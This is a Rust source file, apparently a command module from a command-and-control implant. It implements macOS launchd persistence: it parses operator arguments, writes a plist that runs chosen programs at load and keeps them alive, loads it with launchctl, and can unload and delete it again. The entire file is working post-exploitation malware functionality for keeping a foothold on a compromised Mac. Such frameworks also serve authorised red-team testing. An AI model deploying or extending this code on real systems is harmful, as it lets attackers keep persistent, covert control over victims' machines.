use crate::structs::{Artifact, RmFiles, Task};
use crate::utils::get_user;
use serde::Deserialize;
use std::io::Write;
use tokio::process::Command;

#[derive(Deserialize)]
struct PersistLaunchdArgs {
    #[serde(default, rename = "Label")]
    label: String,
    #[serde(default)]
    args: Vec<String>,
    #[serde(default, rename = "KeepAlive")]
    keep_alive: bool,
    #[serde(default, rename = "RunAtLoad")]
    run_at_load: bool,
    #[serde(default, rename = "LaunchPath")]
    path: String,
    #[serde(default)]
    remove: bool,
}

#[derive(serde::Serialize)]
struct LaunchPlist {
    #[serde(rename = "Label")]
    label: String,
    #[serde(rename = "ProgramArguments")]
    program_arguments: Vec<String>,
    #[serde(rename = "RunAtLoad")]
    run_at_load: bool,
    #[serde(rename = "KeepAlive")]
    keep_alive: bool,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let mut args: PersistLaunchdArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    if args.path.is_empty() {
        response.set_error("No path supplied");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Expand ~ for non-root users
    if args.path.starts_with('~') {
        let user = get_user();
        if user == "root" {
            response.set_error("Can't use ~ with root user. Please specify an absolute path.");
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
        args.path = args.path.replacen('~', &format!("/Users/{}", user), 1);
    }

    if args.remove {
        // Unload the plist via launchctl
        let unload_result = Command::new("launchctl")
            .args(["unload", &args.path])
            .output()
            .await;
        match unload_result {
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                if !output.status.success() && !stderr.is_empty() {
                    response.user_output = format!("Unload warning: {}\n", stderr);
                }
            }
            Err(e) => {
                response.set_error(&format!("Failed to unload: {}", e));
                let _ = task.job.send_responses.send(response).await;
                let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
                return;
            }
        }

        // Remove the plist file
        match std::fs::remove_file(&args.path) {
            Ok(_) => {
                response.user_output += "Removed file";
                response.completed = true;
                response.removed_files = Some(vec![RmFiles {
                    path: args.path.clone(),
                    host: String::new(),
                }]);
            }
            Err(e) => {
                response.set_error(&format!("{}", e));
            }
        }

        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Create the plist
    let plist_data = LaunchPlist {
        label: args.label,
        program_arguments: args.args,
        run_at_load: args.run_at_load,
        keep_alive: args.keep_alive,
    };

    let mut plist_xml = Vec::new();
    match plist::to_writer_xml(&mut plist_xml, &plist_data) {
        Ok(_) => {}
        Err(e) => {
            response.set_error(&format!("Failed to create plist: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Write plist file
    match std::fs::File::create(&args.path) {
        Ok(mut f) => {
            if let Err(e) = f.write_all(&plist_xml) {
                response.set_error(&format!("Failed to write plist: {}", e));
                let _ = task.job.send_responses.send(response).await;
                let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
                return;
            }
        }
        Err(e) => {
            response.set_error(&format!("Failed to create file: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    }

    response.artifacts = Some(vec![Artifact {
        base_artifact: "FileCreate".to_string(),
        artifact: args.path.clone(),
    }]);

    // Load the plist via launchctl
    let load_result = Command::new("launchctl")
        .args(["load", &args.path])
        .output()
        .await;

    match load_result {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            response.user_output = "Launchd persistence file created\nLoading via launchctl...\n".to_string();
            if output.status.success() {
                response.user_output += &format!("Successfully loaded\n{}{}", stdout, stderr);
                response.completed = true;
            } else {
                response.set_error(&format!(
                    "{}Load failed: {}{}",
                    response.user_output, stdout, stderr
                ));
            }
        }
        Err(e) => {
            response.set_error(&format!("Failed to load: {}", e));
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
